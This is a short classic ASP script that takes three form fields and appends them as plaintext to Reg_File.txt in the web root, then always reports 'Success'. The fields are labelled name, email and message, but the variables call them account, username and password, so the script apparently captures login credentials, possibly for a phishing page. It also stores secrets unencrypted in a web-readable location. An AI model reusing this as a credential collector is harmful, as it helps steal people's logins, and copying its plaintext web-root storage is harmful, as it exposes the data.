<% @ language=vbscript %>
<% option explicit 

	response.expires=0
	const reading=1
	const appending=8
	const writing=2
	const opendefault=-2
	const openunicode=-1
	const openascii=0
	
	dim o1,o2,o3(0),flag,un,pass,str,path,acc
	path=server.mappath("/")
	'Response.Write(path)
	acc=trim(request.form("name"))	
	un=trim(request.form("email"))	
	pass=trim(request.form("message"))
	set o1=server.createobject("scripting.filesystemobject")
	if o1.fileexists(path & "/Reg_File.txt") then
		set o2=o1.opentextfile(path & "/Reg_File.txt",reading,false,openascii)
	else
		Response.Write("Storage file missing!")
		Response.End
	end if

	if pass<>"" AND un<>"" then
		set o2=o1.opentextfile(path & "/Reg_File.txt",appending,false,openascii)
		o2.writeline vbcrlf & acc & ": " & un & vbcrlf & pass & vbcrlf & "-----------------------------------------------------"
		o2.close
	end if
	Response.Write("Success")
	Response.End
%>